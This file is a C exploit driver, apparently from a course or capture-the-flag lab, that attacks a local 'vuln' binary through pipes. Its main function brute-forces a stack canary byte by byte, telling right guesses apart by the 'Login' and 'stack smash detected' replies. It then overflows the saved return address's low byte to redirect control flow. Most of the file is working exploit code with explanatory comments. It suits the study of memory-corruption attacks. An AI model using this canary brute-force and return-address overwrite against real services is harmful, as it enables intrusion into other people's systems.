#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;

  
   uint64_t auth_bp =           0x7ffc3f37ce20; // rbp value in auth
   uint64_t auth_cred_loc =     0x7ffc3f37ce10; // loc of cred 
   uint64_t auth_db_loc =       0x7ffc3f37ce08; // loc of db (local var of auth)
   uint64_t auth_cred     =     0x7ffc3f37cce0; // value of cred (after alloca)

   uint64_t auth_bp_cred_loc_dist  = auth_cred_loc - auth_bp;
   uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;
 
   uint64_t main_bp =           0x7ffc3f37d6f0; // saved rbp value in mainloop
   uint64_t auth_main_bp_dist = auth_bp - main_bp; 
   
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message

   // LSB byte of target location that I want to use in overflow
   unsigned char ret_lsb= 0xc0;
   
   unsigned explsz = auth_db_cred_dist+8;
   void* *expl = (void**)malloc(explsz);
   memset((void*)expl, '\0', explsz);
   
   // each byte of canary will placed in these variable after successful bruteforce in each loop
   unsigned char byte0,byte1,byte2,byte3,byte4,byte5,byte6,byte7;
   // LSB byte of canary is 0x00 all the time.
   byte0 = 0x00;
   //in each of the following 7 loop I try to bruteforce 1 byte and break the execution of the loop when I received the proper value form VULN.
   // in the worst case I have to bruteforce 256 different values and I get 255 value of "stack smash detected" from the VULN.
   // if I get the value of "Login" from the VULN I will break the loop and increase the vector size by 1 byte and will try to bruteforce another byte.
   
   unsigned char input2[] = {byte0, 0x00};
   char msg[50];
   char sign[50] = "Login";
   for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input2[1] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input2, 2);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte1 = i;
			 printf("\nFound 1st Byte: %x", byte1);
			 break;
			 
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input3[] = {byte0, byte1, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input3[2] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input3, 3);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte2 = i;
			 printf("\nFound 2nd Byte: %x\n", byte2);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input4[] = {byte0, byte1, byte2, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input4[3] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input4, 4);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte3 = i;
			 printf("\nFound 3rd Byte: %x\n", byte3);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input5[] = {byte0, byte1, byte2, byte3, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input5[4] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input5, 5);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte4 = i;
			 printf("\nFound 4th Byte: %x\n", byte4);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input6[] = {byte0, byte1, byte2, byte3, byte4, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input6[5] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input6, 6);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte5 = i;
			 printf("\nFound 5th Byte: %x\n", byte5);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input7[] = {byte0, byte1, byte2, byte3, byte4, byte5, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input7[6] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input7, 7);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte6 = i;
			 printf("\nFound 6th Byte: %x\n", byte6);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	unsigned char input8[] = {byte0, byte1, byte2, byte3, byte4, byte5, byte6, 0x00};
	for (int i=1; i<256;i++)
	{
		put_str("p BBBBBBB\n");
        send();
        get_formatted("%*s");
		usleep(100000);
		
		input8[7] = i;
		put_str("u ");		
		put_bin((char*)expl, explsz);
		put_bin((char*)input8, 8);
		put_str("\n");
		send();
		usleep(100000);
		get_formatted("%*s");
		put_str("l \n");
		send();
		usleep(100000);
		get_formatted("%s", msg);
		
		if (!(strcmp(msg,sign)))
		 {
			 byte7 = i;
			 printf("\nFound 7th Byte: %x\n", byte7);
			 break;
		 } 
		 else
			printf("\nNothing\n"); 
	}
	
	printf("\nExtracted Canary: 0x%02x%02x%02x%02x%02x%02x%02x%02x\n",byte7,byte6,byte5,byte4,byte3,byte2,byte1,byte0);
	printf("*************** Redirecting Execution Flow to a Useful Address ***************\n");
	
	//byte0 to byte7 are the canary and on top of the canary I have to put a JUNK value as RBP and after that overwrite LSB byte to redirect the execution flow.
	unsigned char redirect_to_ls[] = {byte0, byte1, byte2, byte3, byte4, byte5, byte6, byte7, 0xDE, 0xAD, 0xBE, 0xEF,0xDE, 0xAD, 0xBE, 0xEF, ret_lsb};
	
	
	put_str("p BBBBBBB\n");
    send();
    get_formatted("%*s");
	usleep(100000);
	put_str("u ");		
	put_bin((char*)expl, explsz);
	put_bin((char*)redirect_to_ls, 17);
	put_str("\n");
	send();
	usleep(100000);
	get_formatted("%*s");
	put_str("l \n");
	send();
	usleep(100000);
	get_formatted("%*s");
		
		
		 
   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
